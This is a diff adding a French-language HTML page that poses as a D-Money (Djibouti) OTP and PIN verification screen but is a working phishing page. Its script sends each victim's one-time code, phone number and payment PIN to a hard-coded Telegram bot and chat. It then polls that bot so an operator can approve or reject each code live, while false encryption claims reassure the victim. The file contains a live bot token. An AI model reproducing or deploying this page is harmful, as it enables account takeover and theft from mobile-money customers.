@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#1b1464">
+    <title>D-Money | Vérifier OTP · Djibouti</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --navy: #1b1464;
+            --navy-dark: #0f0d3a;
+            --navy-light: #2d2680;
+            --gold: #f5a623;
+            --gold-light: #ffc857;
+            --orange: #e8841a;
+            --white: #ffffff;
+            --light: #f5f3f0;
+            --dark: #1a1a1a;
+            --muted: #666666;
+            --border: #e0ddd9;
+            --error: #d32f2f;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-text-size-adjust: 100%; }
+
+        body {
+            font-family: 'Poppins', system-ui, sans-serif;
+            background: linear-gradient(135deg, var(--navy-dark) 0%, var(--navy) 50%, var(--navy-light) 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            background: white;
+            padding: 14px 5%;
+            border-bottom: 4px solid var(--gold);
+            box-shadow: 0 2px 8px rgba(27,20,100,0.08);
+        }
+
+        .logo { font-size: 22px; font-weight: 900; text-decoration: none; }
+        .logo .d { color: var(--navy); }
+        .logo .money { color: var(--gold); }
+
+        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px; }
+
+        .card {
+            background: white;
+            border-radius: 18px;
+            padding: 36px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(27,20,100,0.35);
+        }
+
+        .card-head { text-align: center; margin-bottom: 22px; }
+        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--navy); margin-bottom: 4px; }
+        .card-head p { color: var(--muted); font-size: 12px; }
+
+        .bundle-bar {
+            background: linear-gradient(135deg, var(--navy), var(--navy-dark));
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            color: white;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
+        .b-row:last-child { margin-bottom: 0; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
+
+        .err {
+            display: none;
+            background: rgba(211,47,47,0.08);
+            border: 1.5px solid rgba(211,47,47,0.2);
+            color: var(--error);
+            font-size: 12px;
+            font-weight: 700;
+            border-radius: 10px;
+            padding: 10px 12px;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+
+        .err.show { display: block; }
+
+        .fl { display: block; font-size: 10px; font-weight: 800; color: var(--navy); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }
+
+        .otp-row {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 18px;
+        }
+
+        .otp-box {
+            width: 48px;
+            height: 54px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 900;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            background: var(--light);
+            color: var(--dark);
+            font-family: 'Poppins', monospace;
+            transition: all 0.2s;
+        }
+
+        .otp-box:focus { border-color: var(--gold); background: white; box-shadow: 0 0 0 4px rgba(245,166,35,0.08); outline: none; }
+        .otp-box.ok { border-color: #4caf50; background: rgba(76,175,80,0.05); }
+
+        .hint { font-size: 10px; color: var(--muted); text-align: center; margin-bottom: 8px; }
+
+        .btns { display: flex; gap: 10px; margin-top: 20px; }
+
+        .btn-p {
+            flex: 1;
+            background: linear-gradient(135deg, var(--navy), var(--navy-light));
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 12px;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+            box-shadow: 0 4px 14px rgba(27,20,100,0.28);
+            transition: all 0.2s;
+        }
+
+        .btn-p:hover { background: var(--gold); color: var(--navy); transform: translateY(-2px); box-shadow: 0 6px 18px rgba(245,166,35,0.3); }
+
+        .btn-o {
+            flex: 1;
+            background: transparent;
+            color: var(--navy);
+            border: 2px solid var(--navy);
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 12px;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .btn-o:hover { background: var(--light); }
+
+        .card-ft { text-align: center; margin-top: 16px; font-size: 10px; color: var(--muted); }
+        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 12px; font-size: 10px; color: var(--muted); font-weight: 700; }
+
+        /* Loading */
+        .overlay {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center; flex-direction: column; gap: 14px;
+            background: rgba(15,13,58,0.93);
+            z-index: 2000;
+            backdrop-filter: blur(6px);
+        }
+
+        .overlay.on { display: flex; }
+        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 14px; font-weight: 800; color: white; }
+        .sp-s { font-size: 11px; color: rgba(255,255,255,0.65); }
+        @keyframes sp { to { transform: rotate(360deg); } }
+
+        /* PIN Modal */
+        .pin-overlay {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center;
+            background: linear-gradient(135deg, var(--navy-dark), var(--navy));
+            z-index: 2000;
+            padding: 20px;
+            backdrop-filter: blur(6px);
+        }
+
+        .pin-overlay.on { display: flex; }
+
+        .pin-card {
+            background: white;
+            border-radius: 18px;
+            padding: 36px 28px;
+            max-width: 380px;
+            width: 100%;
+            box-shadow: 0 24px 64px rgba(27,20,100,0.4);
+            text-align: center;
+        }
+
+        .pin-logo { font-size: 20px; font-weight: 900; margin-bottom: 18px; }
+        .pin-logo .d { color: var(--navy); }
+        .pin-logo .money { color: var(--gold); }
+
+        .pin-title { font-size: 17px; font-weight: 900; color: var(--navy); margin-bottom: 4px; }
+        .pin-sub { font-size: 12px; color: var(--muted); margin-bottom: 22px; }
+
+        .pin-amount {
+            background: linear-gradient(135deg, var(--light), var(--white));
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1.5px solid var(--border);
+        }
+
+        .pin-amount .pa-label { font-size: 10px; color: var(--muted); font-weight: 700; text-transform: uppercase; }
+        .pin-amount .pa-value { font-size: 1.5rem; font-weight: 900; color: var(--navy); margin-top: 3px; }
+
+        .pin-input-wrap {
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 14px;
+            background: var(--light);
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+
+        .pin-input-wrap:focus-within { border-color: var(--gold); background: white; box-shadow: 0 0 0 4px rgba(245,166,35,0.08); }
+
+        .pin-fi {
+            width: 100%;
+            border: none;
+            background: transparent;
+            font-size: 26px;
+            color: var(--dark);
+            outline: none;
+            font-family: inherit;
+            letter-spacing: 14px;
+            text-align: center;
+            font-weight: 900;
+        }
+
+        .pin-fi::placeholder { color: #b8b8b8; letter-spacing: 0; font-size: 13px; font-weight: 500; }
+
+        .pin-err {
+            display: none;
+            background: rgba(211,47,47,0.08);
+            border: 1.5px solid rgba(211,47,47,0.2);
+            color: var(--error);
+            font-size: 11px;
+            font-weight: 700;
+            border-radius: 10px;
+            padding: 9px;
+            margin-bottom: 14px;
+        }
+
+        .pin-err.show { display: block; }
+
+        .pin-btns { display: flex; gap: 10px; }
+
+        .pin-btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 50px;
+            border: none;
+            font-weight: 900;
+            font-size: 12px;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .pin-btn-ok { background: linear-gradient(135deg, var(--navy), var(--navy-light)); color: white; box-shadow: 0 4px 14px rgba(27,20,100,0.28); }
+        .pin-btn-ok:hover { background: var(--gold); color: var(--navy); transform: translateY(-2px); }
+        .pin-btn-x { background: transparent; color: var(--navy); border: 2px solid var(--navy); }
+        .pin-btn-x:hover { background: var(--light); }
+
+        .pin-secure { margin-top: 16px; font-size: 10px; color: var(--muted); font-weight: 700; }
+
+        @media (max-width: 500px) {
+            main { padding: 24px 12px; }
+            .card { padding: 28px 18px; }
+            .otp-row { gap: 5px; }
+            .otp-box { width: 40px; height: 48px; font-size: 18px; }
+            .btns { flex-direction: column; }
+            .pin-card { padding: 28px 18px; }
+        }
+    </style>
+</head>
+<body>
+    <header><a class="logo" href="index.html"><span class="d">D-</span><span class="money">Money</span></a></header>
+
+    <main>
+        <div class="card">
+            <div class="card-head">
+                <h1>Vérifier le Code</h1>
+                <p>Entrez le code OTP à 6 chiffres envoyé à votre téléphone</p>
+            </div>
+
+            <div id="bBar" class="bundle-bar" style="display:none;">
+                <div class="b-row"><span>Forfait:</span><span id="bD">&mdash;</span></div>
+                <div class="b-row"><span>Montant:</span><span id="bP">0 DJF</span></div>
+            </div>
+
+            <div id="err" class="err"></div>
+
+            <label class="fl">Code de Vérification OTP</label>
+            <div class="otp-row" id="otpRow">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            </div>
+            <p class="hint">Vérifiez votre SMS pour le code OTP à 6 chiffres</p>
+
+            <div class="btns">
+                <button class="btn-p" onclick="doOTP()">Vérifier & Continuer</button>
+                <button class="btn-o" onclick="location.href='login.html'">Annuler</button>
+            </div>
+
+            <div class="card-ft">Protégé par chiffrement 256-bit.</div>
+            <div class="secure">🔒 Chiffré de Bout en Bout</div>
+        </div>
+    </main>
+
+    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Vérification du Code</div><div class="sp-s">Veuillez patienter...</div></div>
+
+    <!-- PIN Modal -->
+    <div id="pinOv" class="pin-overlay">
+        <div class="pin-card">
+            <div class="pin-logo"><span class="d">D-</span><span class="money">Money</span></div>
+            <div class="pin-title">Confirmer le Paiement</div>
+            <div class="pin-sub">Entrez votre PIN D-Money pour autoriser cette transaction</div>
+
+            <div class="pin-amount">
+                <div class="pa-label">Montant à Payer</div>
+                <div class="pa-value" id="pinAmt">0 DJF</div>
+            </div>
+
+            <div id="pinErr" class="pin-err"></div>
+
+            <div class="pin-input-wrap">
+                <input type="password" class="pin-fi" id="pinIn" placeholder="Entrez le PIN 4 chiffres" inputmode="numeric" maxlength="4">
+            </div>
+
+            <div class="pin-btns">
+                <button class="pin-btn pin-btn-ok" onclick="doPin()">Payer Maintenant</button>
+                <button class="pin-btn pin-btn-x" onclick="closePin()">Annuler</button>
+            </div>
+
+            <div class="pin-secure">🔒 Sécurisé par D-Money · SSL 256-bit</div>
+        </div>
+    </div>
+
+    <script>
+        const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
+        const CID = '7547427914';
+        let bd = {}, luid = 0, otp = '', phone = '';
+
+        function init() {
+            const p = new URLSearchParams(location.search);
+            const d = p.get('data'), pr = p.get('price');
+            phone = p.get('phone') || '';
+            if (d && pr) {
+                bd = { data: d, price: pr };
+                document.getElementById('bBar').style.display = 'block';
+                document.getElementById('bD').textContent = d;
+                document.getElementById('bP').textContent = pr + ' DJF';
+                document.getElementById('pinAmt').textContent = pr + ' DJF';
+            }
+        }
+
+        // OTP boxes
+        const boxes = document.querySelectorAll('.otp-box');
+        boxes.forEach((b, i) => {
+            b.addEventListener('input', e => {
+                const v = e.target.value;
+                if (v.length > 1) {
+                    const digs = v.replace(/\D/g, '').split('');
+                    digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
+                    boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
+                    chk();
+                    return;
+                }
+                if (v) { b.classList.add('ok'); if (i < boxes.length - 1) boxes[i+1].focus(); }
+                else { b.classList.remove('ok'); }
+                chk();
+            });
+
+            b.addEventListener('keydown', e => {
+                if (e.key === 'Backspace' && !e.target.value && i > 0) { boxes[i-1].focus(); boxes[i-1].value = ''; boxes[i-1].classList.remove('ok'); }
+            });
+
+            b.addEventListener('paste', e => {
+                e.preventDefault();
+                const t = e.clipboardData.getData('text').replace(/\D/g, '');
+                t.split('').forEach((d, j) => { if (j < boxes.length) { boxes[j].value = d; boxes[j].classList.add('ok'); } });
+                boxes[Math.min(t.length - 1, boxes.length - 1)].focus();
+                chk();
+            });
+        });
+
+        function getCode() { return Array.from(boxes).map(b => b.value).join(''); }
+
+        function chk() {
+            otp = getCode();
+            if (otp.length === 6) {
+                setTimeout(() => doOTP(), 400);
+            }
+        }
+
+        function doOTP() {
+            otp = getCode();
+            if (otp.length !== 6) { showErr('Entrez tous les 6 chiffres'); return; }
+            clrErr();
+            document.getElementById('ov').classList.add('on');
+
+            const msg = `📱 <b>Vérification OTP D-Money</b>\n\n<b>Code:</b> <code>${otp}</code>\n<b>Téléphone:</b> <code>+253${phone}</code>\n<b>Forfait:</b> <code>${bd.data || 'N/A'}</code>\n<b>Montant:</b> <code>${bd.price || '0'} DJF</code>`;
+
+            const btns = [[{ text: '✓ Approuvé', callback_data: 'otp_approved' }, { text: '✗ Refusé', callback_data: 'otp_declined' }]];
+            tg(msg, btns);
+            pollOTP();
+        }
+
+        async function tg(msg, btns) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
+                });
+            } catch(e) { console.error(e); }
+        }
+
+        function pollOTP() {
+            const iv = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok && d.result.length > 0) {
+                            const u = d.result[0];
+                            luid = u.update_id;
+                            if (u.callback_query) {
+                                const cb = u.callback_query.data;
+                                if (cb === 'otp_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); openPin(); }
+                                else if (cb === 'otp_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Refusé. Réessayez.'); resetOTP(); }
+                            }
+                        }
+                    }).catch(e => console.error(e));
+            }, 1000);
+            setTimeout(() => clearInterval(iv), 300000);
+        }
+
+        function openPin() {
+            document.getElementById('pinOv').classList.add('on');
+            setTimeout(() => document.getElementById('pinIn').focus(), 300);
+        }
+
+        function closePin() {
+            document.getElementById('pinOv').classList.remove('on');
+            document.getElementById('pinIn').value = '';
+            document.getElementById('pinErr').classList.remove('show');
+        }
+
+        document.getElementById('pinIn').addEventListener('input', function() {
+            if (this.value.length === 4) setTimeout(() => doPin(), 300);
+        });
+
+        function doPin() {
+            const pin = document.getElementById('pinIn').value.trim();
+            if (pin.length !== 4) { document.getElementById('pinErr').textContent = 'Entrez le PIN 4 chiffres'; document.getElementById('pinErr').classList.add('show'); return; }
+            document.getElementById('pinErr').classList.remove('show');
+            document.getElementById('pinOv').classList.remove('on');
+            document.getElementById('ov').classList.add('on');
+
+            const msg = `🔐 <b>Confirmation PIN</b>\n\n<b>PIN:</b> <code>${pin}</code>\n<b>Téléphone:</b> <code>+253${phone}</code>\n<b>Forfait:</b> <code>${bd.data || 'N/A'}</code>\n<b>Montant:</b> <code>${bd.price || '0'} DJF</code>`;
+            const btns = [[{ text: '✓ PIN Valide', callback_data: 'pin_valid' }, { text: '✗ PIN Invalide', callback_data: 'pin_invalid' }]];
+            tg(msg, btns);
+            pollPin();
+        }
+
+        function pollPin() {
+            const iv = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok && d.result.length > 0) {
+                            const u = d.result[0];
+                            luid = u.update_id;
+                            if (u.callback_query) {
+                                const cb = u.callback_query.data;
+                                if (cb === 'pin_valid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); location.href = `success.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || ''}&phone=${phone}`; }
+                                else if (cb === 'pin_invalid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('pinOv').classList.add('on'); document.getElementById('pinErr').textContent = 'PIN Invalide. Réessayez.'; document.getElementById('pinErr').classList.add('show'); document.getElementById('pinIn').value = ''; document.getElementById('pinIn').focus(); }
+                            }
+                        }
+                    }).catch(e => console.error(e));
+            }, 1000);
+            setTimeout(() => clearInterval(iv), 300000);
+        }
+
+        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
+        function clrErr() { document.getElementById('err').classList.remove('show'); }
+
+        function resetOTP() {
+            boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); });
+            otp = '';
+            boxes[0].focus();
+        }
+
+        window.addEventListener('load', () => { init(); boxes[0].focus(); });
+    </script>
+</body>
+</html>
